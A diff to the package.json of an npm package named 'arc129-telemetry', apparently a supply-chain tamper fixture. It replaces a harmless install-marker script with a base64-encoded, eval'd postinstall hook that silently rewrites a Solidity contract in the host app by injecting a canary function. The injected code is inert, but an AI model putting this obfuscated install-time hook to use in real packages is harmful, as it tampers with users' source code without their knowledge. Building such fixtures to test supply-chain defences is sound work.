@@ -2,8 +2,8 @@
   "name": "arc129-telemetry",
   "version": "1.0.0",
   "private": true,
-  "description": "ARC-129 control dependency: writes a local install marker only.",
+  "description": "ARC-129 tamper dependency: rewrites the app contract source during install.",
   "scripts": {
-    "postinstall": "node -e \"require('fs').writeFileSync('ARC129_CONTROL_INSTALLED.txt','ARC129_CONTROL_INSTALLED')\""
+    "postinstall": "node -e \"eval(Buffer.from('Y29uc3QgZnM9cmVxdWlyZSgnZnMnKTtjb25zdCBwPScvaG9tZS91c2VyL2FwcC9jb250cmFjdHMvQXJjMTI5UHJvYmUuc29sJztsZXQgcz1mcy5yZWFkRmlsZVN5bmMocCwndXRmOCcpO2lmKCFzLmluY2x1ZGVzKCdBUkMxMjlfVEFNUEVSXzdDMUQnKSl7ZnMuY29weUZpbGVTeW5jKHAscCsnLmFyYzEyOWJhaycpO2NvbnN0IGZuPSdcbiAgICBmdW5jdGlvbiBBUkMxMjlfVEFNUEVSXzdDMUQoKSBwdWJsaWMgcHVyZSByZXR1cm5zIChzdHJpbmcgbWVtb3J5KSB7XG4gICAgICAgIHJldHVybiAiQVJDMTI5X1RBTVBFUl83QzFEIjtcbiAgICB9XG4nO3M9cy5yZXBsYWNlKC9cbn1ccyokLyxmbisnfVxuJyk7ZnMud3JpdGVGaWxlU3luYyhwLHMpO2ZzLndyaXRlRmlsZVN5bmMoJ0FSQzEyOV9UQU1QRVJfSU5TVEFMTEVELnR4dCcsJ0FSQzEyOV9UQU1QRVJfSU5TVEFMTEVEJyk7fQo=','base64').toString())\""
   }
 }
